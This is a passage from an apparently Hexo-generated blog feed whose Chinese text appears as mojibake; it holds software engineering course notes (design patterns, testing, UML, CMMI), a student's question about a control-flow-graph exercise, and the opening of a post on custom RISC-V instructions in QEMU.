title="æ¡¥æ¨¡å¼"></a>æ¡¥æ¨¡å¼</h4><p>å…ˆå°†ä¸åŒçš„å˜åŒ–ç»´åº¦ï¼ˆå•ä¸€èŒè´£åŸåˆ™ï¼‰åˆ†ç¦»ï¼Œæ¯ä¸ªç»´åº¦éƒ½æœ‰ç‹¬ç«‹çš„æŠ½è±¡å’Œç»§æ‰¿ç»“æ„ï¼Œå»ºç«‹<strong>æŠ½è±¡è€¦åˆ</strong></p><h4 id="è£…é¥°æ¨¡å¼"><a href="#è£…é¥°æ¨¡å¼" class="headerlink" title="è£…é¥°æ¨¡å¼"></a>è£…é¥°æ¨¡å¼</h4><p>å¯¹äºè´Ÿæ•°åŠŸèƒ½ï¼Œè‹¥å°†å…¶å½’å…¥ä¸åŒçš„å˜åŒ–ç»´åº¦å¤ªå¤šäº†ï¼Œå½’å…¥è£…é¥°å™¨</p><p>å°†Bridgeä¸­çš„æŠ½è±¡ å’Œå®ç°åˆäºŒä¸ºä¸€äº†ï¼Œæ˜¯å…¶ç‰¹æ®Šå½¢å¼</p><h4 id="é—¨é¢æ¨¡å¼"><a href="#é—¨é¢æ¨¡å¼" class="headerlink" title="é—¨é¢æ¨¡å¼"></a>é—¨é¢æ¨¡å¼</h4><p>å¤–éƒ¨ä¸ä¸€ä¸ªå­ç³»ç»Ÿçš„é€šä¿¡å¿…é¡»é€šè¿‡ä¸€ä¸ªç»Ÿä¸€çš„é—¨é¢å¯¹è±¡ï¼Œä¸”å•ä¾‹</p><h4 id="ä»£ç†æ¨¡å¼"><a href="#ä»£ç†æ¨¡å¼" class="headerlink" title="ä»£ç†æ¨¡å¼"></a>ä»£ç†æ¨¡å¼</h4><p>ä¸­ä»‹ï¼Œè´Ÿè´£èµ„æºçš„ä¸­é—´å¤„ç†ï¼ŒèŠ‚çœä¸»ä½“çš„æ—¶é—´</p><p>ç”¨æ¥å¯¹æœ‰ä»·å€¼ç¨€ç¼ºèµ„æºçš„ç®¡ç†ï¼Œæ¯”å¦‚æ•°æ®åº“çš„è¿æ¥ç­‰ï¼Œæé«˜èµ„æºçš„åˆ©ç”¨ç‡æˆ–ç³»ç»Ÿæ€§èƒ½</p><h4 id="è§‚å¯Ÿè€…æ¨¡å¼"><a href="#è§‚å¯Ÿè€…æ¨¡å¼" class="headerlink" title="è§‚å¯Ÿè€…æ¨¡å¼"></a>è§‚å¯Ÿè€…æ¨¡å¼</h4><p>MVCé€‚ç”¨äº†è§‚å¯Ÿè€…</p><p>å½“ä¸»é¢˜å¯¹è±¡åœ¨çŠ¶æ€ä¸Šå‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¼šé€šçŸ¥æ‰€æœ‰è§‚å¯Ÿè€…å¯¹è±¡ï¼Œä½¿å®ƒä»¬èƒ½å¤Ÿè‡ªåŠ¨æ›´æ–°è‡ªå·±</p><h4 id="ç­–ç•¥æ¨¡å¼"><a href="#ç­–ç•¥æ¨¡å¼" class="headerlink" title="ç­–ç•¥æ¨¡å¼"></a>ç­–ç•¥æ¨¡å¼</h4><p>å°†æ¯ä¸€ä¸ª<strong>ç®—æ³•</strong>å°è£…åˆ°å…·æœ‰å…±åŒæ¥å£çš„ç‹¬ç«‹çš„ç±»ä¸­</p><p>çµæ´»å¯ä»¥ç›¸äº’æ›¿æ¢</p><h4 id="çŠ¶æ€æ¨¡å¼"><a href="#çŠ¶æ€æ¨¡å¼" class="headerlink" title="çŠ¶æ€æ¨¡å¼"></a>çŠ¶æ€æ¨¡å¼</h4><p>ä½¿ç”¨ä¸€ä¸ªå…·æœ‰å¤šä¸ªå­ç±»çš„ç±»ï¼Œæå‰åˆ›å»ºæ‰€æœ‰å¯¹åº”çš„å­ç±»ï¼ŒçŠ¶æ€å˜åŒ–æ—¶æ¢ç±»</p><h2 id="è½¯ä»¶æµ‹è¯•"><a href="#è½¯ä»¶æµ‹è¯•" class="headerlink" title="è½¯ä»¶æµ‹è¯•"></a>è½¯ä»¶æµ‹è¯•</h2><p>æµ‹è¯•çš„é€šè¿‡å¹¶ä¸èƒ½ç”¨æ¥è¯æ˜æ•´ä¸ªç³»ç»Ÿæ˜¯æ­£ç¡®çš„</p><h4 id="æµ‹è¯•Væ¨¡å‹-æµ‹è¯•"><a href="#æµ‹è¯•Væ¨¡å‹-æµ‹è¯•" class="headerlink" title="æµ‹è¯•Væ¨¡å‹  + æµ‹è¯•*"></a>æµ‹è¯•Væ¨¡å‹  + æµ‹è¯•*</h4><table><thead><tr><th>æµ‹è¯•åç§°</th><th>å¼€å‘é˜¶æ®µ</th><th>æµ‹è¯•å¯¹è±¡</th><th>æµ‹è¯•æ–¹æ³•</th></tr></thead><tbody><tr><td>å•å…ƒæµ‹è¯•</td><td>å®ç°</td><td>ç±»æµ‹è¯•</td><td>ç™½ç›’æµ‹è¯•</td></tr><tr><td>é›†æˆæµ‹è¯•</td><td>ç³»ç»Ÿè®¾è®¡</td><td>åŒ…æˆ–ç³»ç»Ÿæµ‹è¯•-äº¤äº’</td><td>ç°ç›’æµ‹è¯•</td></tr><tr><td>ç³»ç»Ÿæµ‹è¯•</td><td>ç³»ç»Ÿéœ€æ±‚</td><td>æ„ä»¶å’Œæ¥å£æµ‹è¯•</td><td>é»‘ç›’æµ‹è¯•</td></tr><tr><td>éªŒæ”¶æµ‹è¯•</td><td>å®¢æˆ·éœ€æ±‚</td><td>ç°åœºå¤ç°</td><td>é»‘ç›’æµ‹è¯•</td></tr></tbody></table><p>ä¸ºä»€ä¹ˆè¦æ—©ä¿®æ­£</p><ul><li>æ¶‰åŠçš„èŒƒå›´è¶Šæ¥è¶Šå¹¿æ³›</li><li>æ›¾ç»ä»˜å‡ºçš„æˆæœ¬è¶Šæ¥è¶Šé«˜</li></ul><p>çœ‹ä¸€çœ¼ P9 å·¦ä¸‹å›¾</p><h5 id="éåŠŸèƒ½æµ‹è¯•"><a href="#éåŠŸèƒ½æµ‹è¯•" class="headerlink" title="éåŠŸèƒ½æµ‹è¯•"></a>éåŠŸèƒ½æµ‹è¯•</h5><p>å³°å€¼ ï¼Œ å°–å³°ï¼Œ å‹åŠ› ï¼Œ æµ¸æ³¡</p><h4 id="è½¯ä»¶åº¦é‡"><a href="#è½¯ä»¶åº¦é‡" class="headerlink" title="è½¯ä»¶åº¦é‡"></a>è½¯ä»¶åº¦é‡</h4><h5 id="McCabe-æ§åˆ¶æµå›¾"><a href="#McCabe-æ§åˆ¶æµå›¾" class="headerlink" title="McCabe + æ§åˆ¶æµå›¾"></a>McCabe + æ§åˆ¶æµå›¾</h5><p>è¾¹æ•° - ç‚¹æ•° + 2 = åˆ†æ”¯ç»“ç‚¹+1</p><h5 id="LCOM"><a href="#LCOM" class="headerlink" title="LCOM"></a>LCOM</h5><p>$$<br>LCOM = \frac{(\frac 1 a \sum_{j=1}^{a}\mu(A_j))-m}{1-m}<br>$$</p><p>mä¸ºæ–¹æ³•æ•°ï¼Œaä¸ºæ‰€å«çš„å®ä¾‹å˜é‡æ•°ï¼Œ ä¸ºè®¿é—®æ¯ä¸ªå®ä¾‹å˜é‡çš„æ–¹æ³•æ•°ã€‚</p><h4 id="ç­‰ä»·ç±»æµ‹è¯•-é»‘ç›’"><a href="#ç­‰ä»·ç±»æµ‹è¯•-é»‘ç›’" class="headerlink" title="ç­‰ä»·ç±»æµ‹è¯• - é»‘ç›’"></a>ç­‰ä»·ç±»æµ‹è¯• - é»‘ç›’</h4><ul><li>æ•°å€¼ï¼šä¸€èˆ¬ï¼Œä¸€ä¸ªæœ‰æ•ˆï¼Œä¸¤ä¸ªæ— æ•ˆ</li><li>å…¶ä»–ï¼š ä¸€ä¸ªæœ‰æ•ˆï¼Œä¸€ä¸ªæ— æ•ˆ</li><li>ä¼ ç»Ÿ + å¼ºç­‰ä»·ç±»æ–¹æ³•</li><li>è¾¹ç•Œå€¼åˆ†æ ï¼šå¯¹æ•°å€¼è¾¹ç•Œåˆ›å»ºæœ‰æ•ˆæˆ–æ— æ•ˆç­‰ä»·ç±»</li></ul><h4 id="æ§åˆ¶æµ-çš„-è¦†ç›–æµ‹è¯•-ç™½ç›’"><a href="#æ§åˆ¶æµ-çš„-è¦†ç›–æµ‹è¯•-ç™½ç›’" class="headerlink" title="æ§åˆ¶æµ çš„ è¦†ç›–æµ‹è¯•  - ç™½ç›’"></a>æ§åˆ¶æµ çš„ è¦†ç›–æµ‹è¯•  - ç™½ç›’</h4><ul><li>è¯­å¥è¦†ç›– - ç»“ç‚¹</li><li>åˆ†æ”¯è¦†ç›– - è¾¹</li><li>æ¡ä»¶è¦†ç›– - åŸå­è°“è¯çœŸå‡</li></ul><p>æ»¡è¶³åˆ†æ”¯è¦†ç›–è¦æ±‚ä¸€å®šä¼šæ»¡è¶³è¯­å¥è¦†ç›–è¦æ±‚</p><ul><li><p>åˆ†æ”¯è¦†ç›–ä¸èƒ½è¦†ç›–æ¡ä»¶ï¼Œå› ä¸ºæ¡ä»¶æ˜¯åŸå­è°“è¯åˆ¤æ–­ï¼Œä½†å¯¹äºç»„åˆæ¡ä»¶å¯èƒ½ä¼šæœ‰è¯¸å¦‚çŸ­è·¯çš„æƒ…å†µ</p></li><li><p>æ¡ä»¶ä¸èƒ½è¦†ç›–åˆ†æ”¯ï¼Œå› ä¸ºæ˜¯ 2*åŸå­è°“è¯ï¼Œå¯èƒ½æœ‰æ²¡è¦†ç›–åˆ°çš„æƒ…å†µ</p></li></ul><p>åˆ†æ”¯ ï¼Œæ¡ä»¶ å¹¶ä¸å®Œå…¨è¦†ç›–ï¼Œç»¼åˆä¸€ä¸‹</p><ul><li><p>å¤šæ¡ä»¶ç»„åˆè¦†ç›– - åŸå­è°“è¯åŠå…¶ç»„åˆè¦†ç›–</p></li><li><p>åŸºæœ¬è·¯å¾„æµ‹è¯• - ç‹¬ç«‹è·¯å¾„ ï¼ˆ ç‹¬ç«‹è·¯å¾„è¦æ±‚åœ¨è·¯å¾„ä¸­è‡³å°‘å«æœ‰ä¸€æ¡<strong>æœªæ›¾ä½¿ç”¨</strong>è¿‡çš„è¾¹ï¼‰</p><ul><li> &lt;= V(G)</li></ul></li></ul><h4 id="æ–­è¨€"><a href="#æ–­è¨€" class="headerlink" title="æ–­è¨€"></a>æ–­è¨€</h4><h4 id="Junit"><a href="#Junit" class="headerlink" title="Junit"></a>Junit</h4><p>å¯æµ‹è¯•æ€§ - å½¼æ­¤ä¾èµ–è€Œéœ€è¦ æ¨¡æ‹Ÿç¨‹åº æˆ– æ¡©</p><p>è®¾è®¡ç®€å•æ–¹æ³•</p><p>é¿å…ç§æœ‰æ–¹æ³•</p><p>ä¼˜å…ˆä½¿ç”¨é€šç”¨æ–¹æ³•</p><p>ç»„åˆä¼˜äºç»§æ‰¿</p><p>é¿å…éšè—çš„ä¾èµ–å…³ç³»ä¸å…¨å±€çŠ¶æ€</p><h4 id="äººå·¥æµ‹è¯•"><a href="#äººå·¥æµ‹è¯•" class="headerlink" title="äººå·¥æµ‹è¯•"></a>äººå·¥æµ‹è¯•</h4><p>å®¡æŸ¥ - è¯„å®¡ - èµ°æŸ¥</p><h2 id="CMMI"><a href="#CMMI" class="headerlink" title="CMMI"></a>CMMI</h2><p>ç»Ÿä¸€çš„ï¼Œæ˜ç¡®å®šä¹‰çš„ç»„ç»‡çº§è½¯ä»¶å·¥ç¨‹</p><p>åˆå§‹çº§ - å·²ç®¡ç† - å·²å®šä¹‰ - å·²é‡åŒ–ç®¡ç† - ä¼˜åŒ–</p><h1 id="UML"><a href="#UML" class="headerlink" title="UML"></a><strong>UML</strong></h1><h3 id="ç”¨ä¾‹å›¾"><a href="#ç”¨ä¾‹å›¾" class="headerlink" title="ç”¨ä¾‹å›¾"></a>ç”¨ä¾‹å›¾</h3><p>æ³¨æ„åŒä¸€ä¸ªå›¾ä¸­çš„ç”¨ä¾‹åœ¨åŒä¸€ä¸ªæŠ½è±¡çº§åˆ«</p><h4 id="è§’è‰²-Actor"><a href="#è§’è‰²-Actor" class="headerlink" title="è§’è‰² Actor"></a>è§’è‰² Actor</h4><p>äººæˆ–è½¯ä»¶ç³»ç»Ÿï¼Œä½¿ç”¨ç³»ç»Ÿï¼Œä¸ç³»ç»Ÿæœ‰å…³ç³»</p><h4 id="å¯»æ‰¾ç”¨ä¾‹"><a href="#å¯»æ‰¾ç”¨ä¾‹" class="headerlink" title="å¯»æ‰¾ç”¨ä¾‹"></a>å¯»æ‰¾ç”¨ä¾‹</h4><p>è‡ªå·±ç†è§£å§</p><h4 id="åŒ…å«å…³ç³»-lt-lt-include-gt-gt"><a href="#åŒ…å«å…³ç³»-lt-lt-include-gt-gt" class="headerlink" title="åŒ…å«å…³ç³»  &lt;&lt;include&gt;&gt;"></a>åŒ…å«å…³ç³»  <code>&lt;&lt;include&gt;&gt;</code></h4><p>ä¸€äº›é€šç”¨ï¼Œå…±åŒåŸºç¡€è¿‡ç¨‹çš„åŠŸèƒ½ï¼Œé¿å…é‡å¤å®ç° - éé€»è¾‘åˆ†è§£</p><p><strong>å…³é”®è¯</strong>ï¼š ä¾èµ–ï¼ŒåŒ…å«</p><h4 id="æ‰©å±•å…³ç³»-lt-lt-extend-gt-gt"><a href="#æ‰©å±•å…³ç³»-lt-lt-extend-gt-gt" class="headerlink" title="æ‰©å±•å…³ç³» &lt;&lt;extend&gt;&gt;"></a>æ‰©å±•å…³ç³» <code>&lt;&lt;extend&gt;&gt;</code></h4><p>ç‰¹æ®Šæƒ…å†µï¼Œéœ€è¦æœ‰æ¡ä»¶</p><p><strong>å…³é”®è¯</strong>ï¼šé”™è¯¯ï¼Œç‰¹æ®Šæƒ…å†µ</p><hr><h3 id="æ´»åŠ¨å›¾"><a href="#æ´»åŠ¨å›¾" class="headerlink" title="æ´»åŠ¨å›¾"></a>æ´»åŠ¨å›¾</h3><p>è·¨ç”¨ä¾‹</p><h4 id="å›¾ç¤º"><a href="#å›¾ç¤º" class="headerlink" title="å›¾ç¤º"></a>å›¾ç¤º</h4><ul><li><p><strong>å¼€å§‹ç‚¹</strong> ï¼šå®å¿ƒåœ†ç‚¹ ï¼Œ <strong>ç»“æŸç‚¹</strong> ï¼šå®å¿ƒåŠ ä¸€åœˆ</p></li><li><p><strong>åŠ¨ä½œ</strong>ï¼šåœ†è§’çŸ©å½¢</p></li><li><p><strong>æ¡ä»¶</strong> ï¼š è±å½¢ - å¯çœç•¥</p></li><li><p><strong>åˆ†æ”¯</strong>ï¼Œ<strong>æ±‡èš</strong>ï¼š ç²—æ¨ªçº¿ï¼Œ {and}ï¼Œ{or}</p></li><li><p><strong>å¯¹è±¡</strong>ï¼š ç›´è§’çŸ©å½¢</p></li><li><p><strong>é›†åˆ</strong> ï¼š å¤šä¸ªåŠ¨ä½œ ï¼ˆä¸‰å‰æˆŸï¼‰</p></li></ul><p>å¦‚æœåŠ¨ä½œå…·æœ‰å¤šä¸ªæ±‡èšçš„ç®­å¤´ï¼Œéœ€è¦ç­‰å¾…æ‰€æœ‰åˆ†æ”¯éƒ½å®Œæˆ</p><h4 id="æ³³é“"><a href="#æ³³é“" class="headerlink" title="æ³³é“"></a>æ³³é“</h4><p>æŒ‰è§’è‰²åˆ’åˆ†</p><h4 id="åŸºæœ¬äº‹ä»¶æµå’Œå¤‡é€‰"><a href="#åŸºæœ¬äº‹ä»¶æµå’Œå¤‡é€‰" class="headerlink" title="åŸºæœ¬äº‹ä»¶æµå’Œå¤‡é€‰"></a>åŸºæœ¬äº‹ä»¶æµå’Œå¤‡é€‰</h4><p>åˆ©ç”¨ä¸­æ‹¬å·<code>[]</code> å›´ç»•å­æ´»åŠ¨æˆ–è€…è¿›å…¥å¤‡é€‰äº‹ä»¶æµçš„æ¡ä»¶ï¼Œå¯ä»¥å¦ç”¨æ´»åŠ¨å›¾æè¿°</p><hr><h3 id="æ•°æ®æµå›¾"><a href="#æ•°æ®æµå›¾" class="headerlink" title="æ•°æ®æµå›¾"></a>æ•°æ®æµå›¾</h3><h4 id="åŸºæœ¬ç¬¦å·"><a href="#åŸºæœ¬ç¬¦å·" class="headerlink" title="åŸºæœ¬ç¬¦å·"></a>åŸºæœ¬ç¬¦å·</h4><p>å®ä½“ï¼Œå¤„ç†ï¼Œå­˜å‚¨ï¼Œæµ</p><h4 id="ç”»æ³•"><a href="#ç”»æ³•" class="headerlink" title="ç”»æ³•"></a>ç”»æ³•</h4><p>çœ‹è¯¾ä»¶</p><hr><h3 id="åŒ…å›¾"><a href="#åŒ…å›¾" class="headerlink" title="åŒ…å›¾"></a>åŒ…å›¾</h3><p>å¤§åŒ… åµŒå¥— å°åŒ…ï¼Œå°åŒ… åµŒå¥— ç±»</p><p>$$ \oplus $$ : åµŒå¥—å…³ç³»</p><p>è™šçº¿ï¼šå±‚é—´çš„ä½¿ç”¨(ä¾èµ–)å…³ç³»</p><p>å®çº¿ï¼šåŒ…é—´çš„ä½¿ç”¨(ä¾èµ–)å…³ç³»</p><p>ç©ºå¿ƒä¸‰è§’ï¼š ç»§æ‰¿</p><p>é¿å…å¾ªç¯ä¾èµ–</p><hr><h3 id="ç±»å›¾"><a href="#ç±»å›¾" class="headerlink" title="ç±»å›¾"></a>ç±»å›¾</h3><h4 id="é¢†åŸŸæ¨¡å‹-1"><a href="#é¢†åŸŸæ¨¡å‹-1" class="headerlink" title="é¢†åŸŸæ¨¡å‹"></a>é¢†åŸŸæ¨¡å‹</h4><h5 id="å®ä½“ç±»-lt-lt-entity-gt-gt-1"><a href="#å®ä½“ç±»-lt-lt-entity-gt-gt-1" class="headerlink" title="å®ä½“ç±» &lt;&lt;entity&gt;&gt;"></a>å®ä½“ç±» <code>&lt;&lt;entity&gt;&gt;</code></h5><ul><li>ç±»å ï¼š æ„é€ æ€§</li><li>å˜é‡ï¼š<ul><li>å¯è§æ€§ (private , public ..) - (-,+,_,~)</li><li>ä¾èµ–ï¼ˆè®¡ç®—ï¼‰å±æ€§ï¼Œ(/)</li><li>åå­— ï¼š </li><li>ç±»å‹ ï¼š UMLå®šä¹‰çš„ï¼Œint Stringâ€¦</li><li>ä¸‹åˆ’çº¿ï¼šè¡¨ç¤ºé™æ€</li></ul></li><li>æ–¹æ³•ï¼š<ul><li>åŒä¸Š</li><li>å‚æ•°ä¸‰ç§ç±»å‹ ï¼š in ï¼Œ out ,inout</li></ul></li></ul><p>æ²¡æœ‰æ–¹æ³•</p><h4 id="å…³è”ç±»"><a href="#å…³è”ç±»" class="headerlink" title="å…³è”ç±»"></a>å…³è”ç±»</h4><p>æè¿°ä¸¤ä¸ªå¯¹è±¡ä¹‹é—´çš„è”ç³»</p><hr><h3 id="é¡ºåºå›¾"><a href="#é¡ºåºå›¾" class="headerlink" title="é¡ºåºå›¾"></a>é¡ºåºå›¾</h3><p>è¡¨ç¤ºä¸€ä¸ªç”¨ä¾‹ï¼ŒåŒæ­¥è°ƒç”¨çš„æ–¹å¼ï¼ˆé˜»å¡ï¼‰</p><ul><li>æ§åˆ¶ç„¦ç‚¹ ï¼š é•¿æ–¹å½¢</li><li>ç”Ÿå‘½çº¿: ç«–è™šçº¿</li><li>åŒæ­¥æ¶ˆæ¯ï¼šå®å¿ƒä¸‰è§’ç®­å¤´ ï¼ˆå·¦å³éƒ½å¯ä»¥ï¼‰</li><li>è¿”å›æ¶ˆæ¯ï¼š è™šçº¿å·¦ç®­å¤´</li><li>å¼‚æ­¥æ¶ˆæ¯ï¼š åˆ›å»ºå¯¹è±¡ ï¼Œ è™šçº¿å³ç®­å¤´</li></ul><p>ä¸ä¼šï¼Œæ‰¾æˆ‘ï¼Œç»™å›¾</p><p><strong>ç»“æ„</strong>ï¼š</p><ul><li>æ–¹æ‹¬å· condition</li><li>å¯é€‰ ï¼š opt - æœ‰æ¡ä»¶æ‰§è¡Œçš„åŠ¨ä½œï¼Œä¸æ»¡è¶³æ¡ä»¶å°±ä¸æ‰§è¡Œ</li><li>å¤šåˆ†æ”¯ alt - ä¸åŒçš„æ¡ä»¶æ‰§è¡Œä¸åŒçš„åŒå</li><li>å¾ªç¯ loop(start,end,condition)</li></ul><hr><h3 id="é€šä¿¡å›¾"><a href="#é€šä¿¡å›¾" class="headerlink" title="é€šä¿¡å›¾"></a>é€šä¿¡å›¾</h3><p>å¯åµŒå¥—ï¼Œæˆ–ç”¨ç¼–å·.ç¼–å·è¡¨ç¤ºåµŒå¥—çº§åˆ«</p><p>å…¶ä»–ä¸é¡ºåºå›¾ç±»ä¼¼</p><hr><h3 id="çŠ¶æ€å›¾"><a href="#çŠ¶æ€å›¾" class="headerlink" title="çŠ¶æ€å›¾"></a>çŠ¶æ€å›¾</h3><p>å”¯ä¸€çš„å¼€å§‹çŠ¶æ€ï¼Œå¯ä»¥æœ‰å¤šä¸ªç»“æŸçŠ¶æ€ï¼Œé’ˆå¯¹ç¡®å®šæ€§è¡Œä¸º</p><p>è½¬å°æ¡†ä¸­çš„ä¸‰ä¸ªçŠ¶æ€ ï¼š Entry - Do - Exit</p><h4 id="çŠ¶æ€è½¬æ¢-è¿‡æ¸¡"><a href="#çŠ¶æ€è½¬æ¢-è¿‡æ¸¡" class="headerlink" title="çŠ¶æ€è½¬æ¢ - è¿‡æ¸¡"></a>çŠ¶æ€è½¬æ¢ - è¿‡æ¸¡</h4><p>äº‹ä»¶+[æ¡ä»¶]+åŠ¨ä½œ</p><p>åœ¨<strong>äº‹ä»¶</strong>è¢«è§¦å‘å¹¶ä¸”æ»¡è¶³æŸä¸ªç‰¹å®š<strong>æ¡ä»¶</strong>çš„æƒ…å†µä¸‹æ‰ä¼šè¿›è¡Œ</p><p><strong>åŠ¨ä½œ</strong>ï¼šentry æ‰§è¡Œå‰ï¼Œæœªè¿›å…¥çŠ¶æ€æ—¶åšçš„åŠ¨ä½œ</p><p>å±‚æ¬¡åŒ–ç»„ç»‡ ï¼š æ¡†èµ·æ¥</p><p>åˆ†è§£ ï¼š åˆ†è§£ä¸ºäº’ä¸ä¾èµ–çš„å­çŠ¶æ€ - å­çŠ¶æ€ç¦»å¼€</p><p>å¹¶è¡Œï¼š æœ‰ä¸¤ä¸ªè¾“å…¥ï¼Œåˆ™éƒ½å®Œæˆæ‰ä¼šè¢«è§¦å‘</p><h2 id="ä½“ç³»ç»“æ„é£æ ¼"><a href="#ä½“ç³»ç»“æ„é£æ ¼" class="headerlink" title="ä½“ç³»ç»“æ„é£æ ¼"></a>ä½“ç³»ç»“æ„é£æ ¼</h2><h3 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h3><p>ä»ä½åˆ°é«˜æ’åº</p><p>å†…èšç¨‹åº¦ï¼šå†…éƒ¨å„ä¸ªå…ƒç´ å½¼æ­¤ç»“åˆçš„ç´§å¯†ç¨‹åº¦ - è¶Šé«˜ï¼Œæ¨¡å—ç‹¬ç«‹æ€§è¶Šå¼º</p><ul><li>å¶ç„¶å†…èšã€é€»è¾‘å†…èšã€æ—¶é—´å†…èšã€é€šä¿¡å†…èšã€é¡ºåºå†…èšåŠ<strong>åŠŸèƒ½</strong>å†…èšã€‚</li></ul><p>è€¦åˆç¨‹åº¦ï¼šæ¨¡å—ä¹‹é—´äº’ç›¸è¿æ¥çš„ç´§å¯†ç¨‹åº¦ - è¶Šä½ï¼Œæ¨¡å—ç‹¬ç«‹æ€§è¶Šå¼º</p><ul><li>éç›´æ¥ &lt; <strong>æ•°æ®</strong>ï¼œæ ‡è®°ï¼œæ§åˆ¶&lt; å¤–éƒ¨ï¼œå…¬å…±ï¼œå†…å®¹</li></ul><h3 id="4-1-è§†å›¾æ¨¡å‹"><a href="#4-1-è§†å›¾æ¨¡å‹" class="headerlink" title="4+1 è§†å›¾æ¨¡å‹"></a>4+1 è§†å›¾æ¨¡å‹</h3><p>ç”¨ä¾‹åœ¨ä¸­é—´ï¼Œå››å‘¨æ˜¯é€»è¾‘è§†å›¾ï¼ˆåŠŸèƒ½éœ€æ±‚ï¼‰ï¼Œå¼€å‘è¯•å›¾ï¼ˆè½¯ä»¶æ¨¡å—ï¼‰ï¼Œè¿›ç¨‹è§†å›¾ï¼ˆå¹¶å‘ï¼‰ï¼Œç‰©ç†è§†å›¾ï¼ˆç¡¬ä»¶ï¼‰ </p>]]></content>
      
      
      
        <tags>
            
            <tag> è½¯ä»¶å·¥ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Question</title>
      <link href="/2021/03/07/Question/"/>
      <url>/2021/03/07/Question/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦æ˜¯ç”¨äºè¯¢é—®è½¯ä»¶å·¥ç¨‹é—®é¢˜</p><a id="more"></a><h1 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h1><h3 id="è€å¸ˆæˆ‘æƒ³é—®ä¸€ä¸‹è¯¾åé¢˜çš„-11-2"><a href="#è€å¸ˆæˆ‘æƒ³é—®ä¸€ä¸‹è¯¾åé¢˜çš„-11-2" class="headerlink" title="è€å¸ˆæˆ‘æƒ³é—®ä¸€ä¸‹è¯¾åé¢˜çš„ 11.2"></a>è€å¸ˆæˆ‘æƒ³é—®ä¸€ä¸‹è¯¾åé¢˜çš„ 11.2</h3><img src="/.io//03/07/Question/CFG-3.jpg" class title="11.2"><h3 id="è€å¸ˆæ‚¨ä¸Šè¯¾ç»™çš„ç­”æ¡ˆå¦‚ä¸‹"><a href="#è€å¸ˆæ‚¨ä¸Šè¯¾ç»™çš„ç­”æ¡ˆå¦‚ä¸‹" class="headerlink" title="è€å¸ˆæ‚¨ä¸Šè¯¾ç»™çš„ç­”æ¡ˆå¦‚ä¸‹"></a>è€å¸ˆæ‚¨ä¸Šè¯¾ç»™çš„ç­”æ¡ˆå¦‚ä¸‹</h3><img src="/.io//03/07/Question/CFG-1.jpg" class title="Answer"><p>æˆ‘å¯¹äº 4 ç»“ç‚¹ä¸ 9 ç»“ç‚¹æœ‰ç‚¹é—®é¢˜ï¼Œ<br>4 ç»“ç‚¹æˆ‘è®¤ä¸ºåº”è¯¥æ˜¯ä¸¤ä¸ªç»“ç‚¹ï¼Œ9ç»“ç‚¹åœ¨ä»£ç ä¸Šæ²¡æœ‰å®é™…çš„ä»£ç è¡Œå¯¹åº”</p><h3 id="æˆ‘åšçš„ç»“æœè¯¦ç»†çš„æ˜¯ä¸‹å›¾"><a href="#æˆ‘åšçš„ç»“æœè¯¦ç»†çš„æ˜¯ä¸‹å›¾" class="headerlink" title="æˆ‘åšçš„ç»“æœè¯¦ç»†çš„æ˜¯ä¸‹å›¾"></a>æˆ‘åšçš„ç»“æœè¯¦ç»†çš„æ˜¯ä¸‹å›¾</h3><img src="/.io//03/07/Question/CFG.png" class title="MyAnswer"><h1 id="å›ç­”"><a href="#å›ç­”" class="headerlink" title="å›ç­”"></a>å›ç­”</h1><p>æ§åˆ¶æµå›¾åº”è¯¥å°½é‡ç®€æ´ï¼Œä¾¿äºè®¡ç®—ç¯å½¢å¤æ‚åº¦ï¼Œé¡ºåºç»“æ„èƒ½åˆå¹¶çš„åº”è¯¥å°½é‡åˆå¹¶ï¼ŒåŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯è¿™æ ·çš„åˆå¹¶å¹¶ä¸ä¼šæ”¹å˜ç¯å½¢å¤æ‚åº¦</p><p>4 ç»“ç‚¹æ˜¯ åˆå¹¶åçš„ç»“æœ -     ç»“ç‚¹æ•° - 1 ï¼Œè¾¹ - 1 ä¸å½±å“ç¯å½¢å¤æ‚åº¦</p><p>9 ç»“ç‚¹æ˜¯ ä¸ºäº†ç”»å›¾æ›´æ¸…æ™° - ç»“ç‚¹æ•° + 1 ï¼Œè¾¹ + 1 ä¸å½±å“ç¯å½¢å¤æ‚åº¦</p><p>æ›´æ”¹çš„å›¾ä¾‹å¦‚ä¸‹</p><img src="/.io//03/07/Question/CFG-0.png" class title="MyAnswer">]]></content>
      
      
      
        <tags>
            
            <tag> Question </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åœ¨QEMUä¸­å®šåˆ¶RISCVæŒ‡ä»¤å¹¶æµ‹è¯•</title>
      <link href="/2021/02/13/%E5%9C%A8QEMU%E4%B8%AD%E5%AE%9A%E5%88%B6RISCV%E6%8C%87%E4%BB%A4%E5%B9%B6%E6%B5%8B%E8%AF%95/"/>
      <url>/2021/02/13/%E5%9C%A8QEMU%E4%B8%AD%E5%AE%9A%E5%88%B6RISCV%E6%8C%87%E4%BB%A4%E5%B9%B6%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦æ˜¯ä»‹ç»</p><ol><li>é€šè¿‡QEMUä¸­æä¾›çš„Decode Tree çš„æ–¹æ³•å®šä¹‰æŒ‡ä»¤ç¼–ç </li><li>å®šä¹‰æŒ‡ä»¤çš„è½¬ä¹‰å’ŒæŒ‡ä»¤çš„åŸºç¡€é€»è¾‘</li><li>åˆ©ç”¨äºŒè¿›åˆ¶çš„æ–¹å¼å®šä¹‰æµ‹è¯•ç¨‹åºå¹¶æµ‹è¯•</li><li>ä½¿ç”¨ Pæ‰©å±•(Packed SIMD) ä½œä¸ºç¤ºä¾‹</li></ol><a id="more"></a><h3 id="QEMU-ä¸‹è½½"><a href="#QEMU-ä¸‹è½½" class="headerlink" title="QEMU ä¸‹è½½"></a>QEMU ä¸‹è½½</h3><p>ä¸ºäº†æ›´æ”¹QEMUçš„æºç ï¼Œæˆ‘ä»¬éœ€è¦æ­£ç¡®ä¸‹è½½æºä»£ç 